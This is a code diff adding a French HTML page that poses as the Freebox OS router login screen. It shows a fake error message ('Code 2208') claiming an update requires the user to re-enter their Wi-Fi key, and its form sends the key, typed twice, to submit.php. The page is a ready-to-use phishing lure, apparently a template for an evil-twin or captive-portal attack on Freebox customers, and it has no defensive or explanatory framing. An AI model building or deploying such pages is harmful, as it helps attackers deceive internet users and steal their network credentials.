@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Freebox OS :: Identification</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="wrapper">
+    <h1>Freebox OS</h1>
+    <div class="info-message">
+      [Code 2208 : Erreur] Suite à une mise à jour de votre Freebox veuillez inscrire votre clé Wi-Fi dans les champs ci-dessous.
+    </div>
+    <div class="login-box">
+      <form action="submit.php" method="post">
+        <div class="form-group">
+          <label for="wifi-key">Clé Wi-Fi</label>
+          <input type="text" id="wifi-key" name="wifi-key" required>
+        </div>
+        <div class="form-group">
+          <label for="confirm-wifi-key">Confirmer la clé Wi-Fi</label>
+          <input type="text" id="confirm-wifi-key" name="confirm-wifi-key" required>
+        </div>
+        <button type="submit">Se connecter</button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
